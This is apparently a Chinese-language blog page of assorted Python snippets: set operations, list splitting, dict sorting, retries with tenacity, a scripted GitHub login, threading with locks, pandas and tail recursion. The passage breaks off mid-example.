<h3 id="取交集，并集和差集"><a href="#取交集，并集和差集" class="headerlink" title="取交集，并集和差集"></a>取交集，并集和差集</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>]，b = [<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>]</span><br><span class="line"></span><br><span class="line">交集:</span><br><span class="line"></span><br><span class="line">print list(set(a).intersection(set(b)))</span><br><span class="line"></span><br><span class="line">#或者</span><br><span class="line">isec = [val <span class="keyword">for</span> val <span class="keyword">in</span> a <span class="keyword">if</span> val <span class="keyword">in</span> b]</span><br><span class="line">print isec</span><br><span class="line"></span><br><span class="line">并集</span><br><span class="line">print list(set(a).union(set(b)))</span><br><span class="line">差集</span><br><span class="line">print list(set(b).difference(set(a))) # b-a</span><br><span class="line">a = [[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">4</span>],[<span class="number">1</span>,<span class="number">4</span>]]</span><br><span class="line">b = [x <span class="keyword">for</span> j <span class="keyword">in</span> a <span class="keyword">for</span> x <span class="keyword">in</span> j]</span><br><span class="line">print b</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure>
<h3 id="list分割成固定长度子list"><a href="#list分割成固定长度子list" class="headerlink" title="list分割成固定长度子list"></a>list分割成固定长度子list</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def splite_list(splist, s):</span><br><span class="line">    <span class="string">""</span><span class="string">"splite a list to sub list contain s"</span><span class="string">""</span></span><br><span class="line">    <span class="keyword">return</span> [splist[i:i + s] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(splist)) <span class="keyword">if</span> i % s == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">#test</span><br><span class="line">list1 = range(<span class="number">10</span>)</span><br><span class="line">splite_list(list1,<span class="number">2</span>)</span><br><span class="line">[[<span class="number">0</span>, <span class="number">1</span>], [<span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>], [<span class="number">6</span>, <span class="number">7</span>], [<span class="number">8</span>, <span class="number">9</span>]]</span><br></pre></td></tr></table></figure>
<h3 id="生成英文字母表"><a href="#生成英文字母表" class="headerlink" title="生成英文字母表"></a>生成英文字母表</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">小写字母表</span><br><span class="line">list(map(chr,list(range(<span class="number">97</span>, <span class="number">123</span>))))</span><br><span class="line"></span><br><span class="line">大写字母</span><br><span class="line">list(map(chr,list(range(<span class="number">65</span>, <span class="number">91</span>))))</span><br><span class="line"></span><br><span class="line">小写字母表</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">string.ascii_uppercase</span><br><span class="line"></span><br><span class="line">大写字母</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">string.ascii_lowercase</span><br></pre></td></tr></table></figure>
<h3 id="字典排序"><a href="#字典排序" class="headerlink" title="字典排序"></a>字典排序</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">按键排序</span><br><span class="line">dic = &#123;<span class="string">'a'</span>:<span class="number">11</span> , <span class="string">'b'</span>:<span class="number">5</span> , <span class="string">'c'</span>: <span class="number">7</span>&#125;</span><br><span class="line"></span><br><span class="line"># 升序排序</span><br><span class="line">sorted(dic.keys())</span><br><span class="line"></span><br><span class="line">#　降序排序</span><br><span class="line">sorted(dic.keys(), reverse=True)</span><br><span class="line"></span><br><span class="line">按值排序</span><br><span class="line">dic = &#123;<span class="string">'a'</span>:<span class="number">11</span> , <span class="string">'b'</span>:<span class="number">5</span> , <span class="string">'c'</span>: <span class="number">7</span>&#125;</span><br><span class="line"></span><br><span class="line"># 升序</span><br><span class="line">sorted(dic.items(), key = lambda x:x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"># 降序</span><br><span class="line">sorted(dic.items(), key = lambda x:x[<span class="number">1</span>],reverse =True)</span><br></pre></td></tr></table></figure>
<h3 id="微信公众号或网页自动导出"><a href="#微信公众号或网页自动导出" class="headerlink" title="微信公众号或网页自动导出"></a>微信公众号或网页自动导出</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//juejin.im/post/5b4cc601f265da0f5a2545a9</span></span><br><span class="line">https:<span class="comment">//github.com/MartinHan01/webpage2img</span></span><br><span class="line">pip install pillow</span><br><span class="line">init_filelist()</span><br><span class="line">    #首先初始化webdirver</span><br><span class="line">    driver = webdriver.Chrome()</span><br><span class="line">    #设置输出路径</span><br><span class="line">    dir = <span class="string">'./result'</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> filelist:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            #获取图片路径，标题，以及输出路径</span><br><span class="line">            #自动滚动，并截图保存</span><br><span class="line">            pic_path,title = save_url(driver, item, dir)</span><br><span class="line">            #开始合并我们刚刚截的所有图</span><br><span class="line">            package_picture(pic_path, os.path.abspath(dir), title)</span><br><span class="line">        except Exception <span class="keyword">as</span> e :</span><br><span class="line">            print(e)</span><br><span class="line">python crop.py</span><br></pre></td></tr></table></figure>
<h3 id="批量压缩图片"><a href="#批量压缩图片" class="headerlink" title="批量压缩图片"></a>批量压缩图片</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade tinify</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tinify</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">tinify.key = <span class="string">'此处填入你的key'</span></span><br><span class="line">path = "xxx" # 图片存放的路径</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> dirpath, dirs, files <span class="keyword">in</span> os.walk(path):</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        imgpath = os.path.join(dirpath, file)</span><br><span class="line">        print(<span class="string">"compressing ..."</span>+ imgpath)</span><br><span class="line">        tinify.from_file(imgpath).to_file(imgpath)</span><br></pre></td></tr></table></figure>
<h3 id="重试"><a href="#重试" class="headerlink" title="重试"></a>重试</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> tenacity <span class="keyword">import</span> retry</span><br><span class="line">@retry</span><br><span class="line">def do_something_unreliable():</span><br><span class="line">    <span class="keyword">if</span> random.randint(<span class="number">0</span>, <span class="number">10</span>) &gt; <span class="number">1</span>:</span><br><span class="line">        raise IOError(<span class="string">"Broken sauce, everything is hosed!!!111one"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Awesome sauce!"</span></span><br><span class="line">print(do_something_unreliable())</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tenacity <span class="keyword">import</span> *</span><br><span class="line">@retry(stop=(stop_after_delay(<span class="number">10</span>) | stop_after_attempt(<span class="number">5</span>)), wait=wait_fixed(<span class="number">2</span>))</span><br><span class="line">def stop_after_10_s_or_5_retries():</span><br><span class="line">    print(<span class="string">"Stopping after 10 seconds or 5 retries"</span>)</span><br><span class="line">    raise Exception</span><br><span class="line">    </span><br><span class="line"> 重试<span class="number">5</span>次，每次间隔<span class="number">10</span>秒，重试前等待<span class="number">2</span>秒</span><br><span class="line">   def func():</span><br><span class="line">       pass</span><br><span class="line">   <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">       <span class="keyword">while</span> True:</span><br><span class="line">           <span class="keyword">try</span>:</span><br><span class="line">               func()</span><br><span class="line">           except SomeSpecificException:</span><br><span class="line">               <span class="keyword">continue</span></span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line"> def verify_url(url):</span><br><span class="line">     <span class="keyword">import</span> requests</span><br><span class="line">     <span class="keyword">try</span>:</span><br><span class="line">         requests.get(url, timeout=<span class="number">10</span>)</span><br><span class="line">         <span class="keyword">return</span> True</span><br><span class="line">     except requests.exceptions.ConnectTimeout:</span><br><span class="line">         <span class="keyword">return</span> False</span><br><span class="line"> def main():</span><br><span class="line">     <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">         <span class="keyword">try</span>:</span><br><span class="line">             <span class="keyword">if</span> verify_url(<span class="string">''</span>):</span><br><span class="line">                 <span class="keyword">return</span></span><br><span class="line">             <span class="keyword">else</span>:</span><br><span class="line">                 <span class="keyword">continue</span></span><br><span class="line">         except KeyError:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line"> <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">     main()          </span><br><span class="line">    https:<span class="comment">//zhangslob.github.io/2019/01/14/Python%E9%87%8D%E8%AF%95%E7%9A%84%E5%A4%9A%E9%87%8D%E6%96%B9%E6%B3%95/</span></span><br></pre></td></tr></table></figure>
<h3 id="登录GitHub"><a href="#登录GitHub" class="headerlink" title="登录GitHub"></a>登录GitHub</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, br'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9,en;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line">    <span class="string">'Host'</span>: <span class="string">'github.com'</span>,</span><br><span class="line">    <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line">s = requests.session()</span><br><span class="line">s.headers.update(headers)</span><br><span class="line">def get_token():</span><br><span class="line">    url = <span class="string">'https://github.com/login'</span></span><br><span class="line">    response = s.get(url)</span><br><span class="line">    pat = <span class="string">'name=\"authenticity_token\" value=\"(.*?)\"'</span></span><br><span class="line">    authenticity_token = re.findall(pat, response.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> authenticity_token</span><br><span class="line">def login(authenticity_token, account, password):</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">'commit'</span>: <span class="string">'Sign in'</span>,</span><br><span class="line">        <span class="string">'utf8'</span>: <span class="string">'\u2713'</span>,</span><br><span class="line">        <span class="string">'authenticity_token'</span>: authenticity_token,</span><br><span class="line">        <span class="string">'login'</span>: account,</span><br><span class="line">        <span class="string">'password'</span>: password,</span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">'https://github.com/session'</span></span><br><span class="line">    response = s.post(url, data=payload)</span><br><span class="line">    print(response)</span><br><span class="line">    # do whatever you want</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    account, password = <span class="string">'account'</span>, <span class="string">'password'</span></span><br><span class="line">    authenticity_token = get_token()</span><br><span class="line">    login(authenticity_token, account, password)</span><br></pre></td></tr></table></figure>
<h3 id="多线程和多进程"><a href="#多线程和多进程" class="headerlink" title="多线程和多进程"></a>多线程和多进程</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> concurrent.futures</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line">URLS = [<span class="string">'http://www.foxnews.com/'</span>,</span><br><span class="line">        <span class="string">'http://www.cnn.com/'</span>,</span><br><span class="line">        <span class="string">'http://europe.wsj.com/'</span>,</span><br><span class="line">        <span class="string">'http://www.bbc.co.uk/'</span>,</span><br><span class="line">        <span class="string">'http://some-made-up-domain.com/'</span>]</span><br><span class="line"># Retrieve a single page and report the URL and contents</span><br><span class="line">def load_url(url, timeout):</span><br><span class="line">    <span class="keyword">with</span> urllib.request.urlopen(url, timeout=timeout) <span class="keyword">as</span> conn:</span><br><span class="line">        <span class="keyword">return</span> conn.read()</span><br><span class="line"># We can use a with statement to ensure threads are cleaned up promptly</span><br><span class="line"><span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=<span class="number">5</span>) <span class="keyword">as</span> executor:</span><br><span class="line">    # Start the load operations and mark each future with its URL</span><br><span class="line">    future_to_url = &#123;executor.submit(load_url, url, <span class="number">60</span>): url <span class="keyword">for</span> url <span class="keyword">in</span> URLS&#125;</span><br><span class="line">    <span class="keyword">for</span> future <span class="keyword">in</span> concurrent.futures.as_completed(future_to_url):</span><br><span class="line">        url = future_to_url[future]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = future.result()</span><br><span class="line">        except Exception <span class="keyword">as</span> exc:</span><br><span class="line">            print(<span class="string">'%r generated an exception: %s'</span> % (url, exc))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'%r page is %d bytes'</span> % (url, len(data)))</span><br><span class="line">            </span><br><span class="line"> <span class="keyword">import</span> concurrent.futures</span><br><span class="line"> <span class="keyword">import</span> math</span><br><span class="line"> PRIMES = [</span><br><span class="line">     <span class="number">112272535095293</span>,</span><br><span class="line">     <span class="number">112582705942171</span>,</span><br><span class="line">     <span class="number">112272535095293</span>,</span><br><span class="line">     <span class="number">115280095190773</span>,</span><br><span class="line">     <span class="number">115797848077099</span>,</span><br><span class="line">     <span class="number">1099726899285419</span>]</span><br><span class="line"> def is_prime(n):</span><br><span class="line">     <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">         <span class="keyword">return</span> False</span><br><span class="line">     sqrt_n = int(math.floor(math.sqrt(n)))</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, sqrt_n + <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">         <span class="keyword">if</span> n % i == <span class="number">0</span>:</span><br><span class="line">             <span class="keyword">return</span> False</span><br><span class="line">     <span class="keyword">return</span> True</span><br><span class="line"> def main():</span><br><span class="line">     <span class="keyword">with</span> concurrent.futures.ProcessPoolExecutor() <span class="keyword">as</span> executor:</span><br><span class="line">         <span class="keyword">for</span> number, prime <span class="keyword">in</span> zip(PRIMES, executor.map(is_prime, PRIMES)):</span><br><span class="line">             print(<span class="string">'%d is prime: %s'</span> % (number, prime))</span><br><span class="line"> <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">     main()</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">     https:<span class="comment">//zhangslob.github.io/2018/07/03/%E5%BF%AB%E9%80%9F%E5%86%99%E4%B8%80%E4%B8%AA%E7%88%AC%E8%99%AB/</span></span><br></pre></td></tr></table></figure>
<h3 id="Pandas-做数据分析"><a href="#Pandas-做数据分析" class="headerlink" title="Pandas 做数据分析"></a>Pandas 做数据分析</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">url = (<span class="string">'https://raw.github.com/pandas-dev/pandas/master/pandas/tests/data/tips.csv'</span>)</span><br><span class="line">tips = pd.read_csv(url)</span><br><span class="line">output = tips.head()</span><br><span class="line">&gt;&gt;&gt; output</span><br><span class="line">   total_bill   tip     sex smoker  day    time  size</span><br><span class="line"><span class="number">0</span>       <span class="number">16.99</span>  <span class="number">1.01</span>  Female     No  Sun  Dinner     <span class="number">2</span></span><br><span class="line"><span class="number">1</span>       <span class="number">10.34</span>  <span class="number">1.66</span>    Male     No  Sun  Dinner     <span class="number">3</span></span><br><span class="line"><span class="number">2</span>       <span class="number">21.01</span>  <span class="number">3.50</span>    Male     No  Sun  Dinner     <span class="number">3</span></span><br><span class="line"><span class="number">3</span>       <span class="number">23.68</span>  <span class="number">3.31</span>    Male     No  Sun  Dinner     <span class="number">2</span></span><br><span class="line"><span class="number">4</span>       <span class="number">24.59</span>  <span class="number">3.61</span>  Female     No  Sun  Dinner     <span class="number">4</span></span><br><span class="line"></span><br><span class="line">sql 语句： SELECT total_bill, tip, smoker, time FROM tips LIMIT <span class="number">5</span>;。</span><br><span class="line"></span><br><span class="line">output = tips[[<span class="string">'total_bill'</span>, <span class="string">'tip'</span>, <span class="string">'smoker'</span>, <span class="string">'time'</span>]].head(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//learnku.com/articles/29825</span></span><br></pre></td></tr></table></figure>
<h3 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">线程 (Thread) 是操作系统能够进行运算调度的最小单位。它被包含在进程中，是进程中的实际运作单位。一个进程中可以并发多个线程，每条线程并行执行不同的任务。同一进程中的多个线程共享进程中的全部系统资源。</span><br><span class="line">以下演示使用多线程对一个变量值进行修改，在循环的次数不多时修改后变量的值是符合预期的，当增加循环次数后，变量最终的值并不符合预期。由此可见：线程之间资源是存在竞争的，修改同一份资源必须加互斥锁，同时需要避免死锁。</span><br><span class="line"></span><br><span class="line"># coding=utf-8</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"># 定义一个字段。多线程执行+1操作</span><br><span class="line">balance = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">def worker1():</span><br><span class="line">    global balance</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">        balance += <span class="number">1</span></span><br><span class="line">    print(<span class="string">'线程1执行完成，balance='</span>+str(balance))</span><br><span class="line"></span><br><span class="line">def worker2():</span><br><span class="line">    global balance</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">        balance += <span class="number">1</span></span><br><span class="line">    print(<span class="string">'线程2执行完成，balance='</span>+str(balance))</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 构造线程对象</span><br><span class="line">    t1 = threading.Thread(target=worker1)</span><br><span class="line">    t2 = threading.Thread(target=worker2)</span><br><span class="line">    # 开始执行</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line"></span><br><span class="line">    <span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">    循环次数为1000时，程序输出：</span></span><br><span class="line"><span class="string">        线程1执行完成，balance=1000</span></span><br><span class="line"><span class="string">        线程2执行完成，balance=2000</span></span><br><span class="line"><span class="string">    循环次数为1000000时，程序输出：</span></span><br><span class="line"><span class="string">        线程1执行完成，balance=1180919</span></span><br><span class="line"><span class="string">        线程2执行完成，balance=1179703</span></span><br><span class="line"><span class="string">    "</span><span class="string">""</span>    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br><span class="line">要想解决以下的问题，需要使用线程的锁对象，只需要对 worker1 和 woker2 方法进行修改。</span><br><span class="line"></span><br><span class="line"># 创建一个互斥锁，默认是未锁定状态</span><br><span class="line">mutex = threading.Lock()</span><br><span class="line"></span><br><span class="line">def worker1():</span><br><span class="line">    global balance</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000000</span>):</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        balance += <span class="number">1</span></span><br><span class="line">        mutex.release()</span><br><span class="line">    print(<span class="string">'线程1执行完成，balance='</span> + str(balance))</span><br><span class="line"></span><br><span class="line">def worker2():</span><br><span class="line">    global balance</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000000</span>):</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        balance += <span class="number">1</span></span><br><span class="line">        mutex.release()</span><br><span class="line">    print(<span class="string">'线程2执行完成，balance='</span> + str(balance))</span><br><span class="line"></span><br><span class="line"><span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">加了互斥锁之后的输出：</span></span><br><span class="line"><span class="string">    线程1执行完成，balance=1941343</span></span><br><span class="line"><span class="string">    线程2执行完成，balance=2000000</span></span><br><span class="line"><span class="string">"</span><span class="string">""</span></span><br><span class="line">特点：</span><br><span class="line"></span><br><span class="line">线程执行的顺序是不确定的</span><br><span class="line">主线程【进程】会等待所有子线程结束后才会退出，主线程【进程】结束么子线程必然结束</span><br><span class="line">线程间共享资源</span><br><span class="line">修改资源必要时需要加锁，同时避免死锁</span><br><span class="line">占用的资源比进程少</span><br><span class="line">线程并不是越多越快</span><br><span class="line">由于 GIL 的原因，多线程并不是真正的并发，只是交替执行</span><br><span class="line">https:<span class="comment">//learnku.com/articles/29367</span></span><br></pre></td></tr></table></figure>
<h3 id="尾递归"><a href="#尾递归" class="headerlink" title="尾递归"></a>尾递归</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 例子代码</span><br><span class="line">def tail_recursion(n, total=<span class="number">0</span>):</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> total</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> tail_recursion(n<span class="number">-1</span>, total+n)</span><br><span class="line"># 执行结果：</span><br><span class="line">tail_recursion(<span class="number">5</span>)</span><br><span class="line">tail_recursion(<span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line">tail_recursion(<span class="number">3</span>, <span class="number">9</span>)</span><br><span class="line">tail_recursion(<span class="number">2</span>, <span class="number">12</span>)</span><br><span class="line">tail_recursion(<span class="number">1</span>, <span class="number">14</span>)</span><br><span 